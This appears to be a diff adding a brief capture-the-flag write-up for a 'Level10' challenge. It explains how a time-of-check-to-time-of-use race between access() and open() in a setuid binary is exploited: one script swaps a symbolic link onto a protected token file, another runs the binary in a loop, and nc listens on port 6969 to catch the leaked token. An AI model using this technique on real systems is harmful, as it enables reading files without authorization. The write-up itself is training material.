@@ -1,0 +1,20 @@
+we can see that in home directory of  Level10 there is executable file named level10 and a file named token
+$> ltrace ./level10 token 10.12.100.215
+
+[...]
+access("token", 4)                                                                                          = -1
+[...]         
+
+main access 
+Warning: Using these calls to check if a user is authorized to,
+for example, open a file before actually doing so using open(2)
+creates a security hole,
+si we that used time  between access and open by create 2 scripts 
+
+script 1 : switch between two link symbolics one we have permission and another is token 
+script 2 : loop for run level10
+and we listen to port 6969 with nc
+
+$> nc -lk 6969
+$> ./script1.sh
+$> ./script2.sh
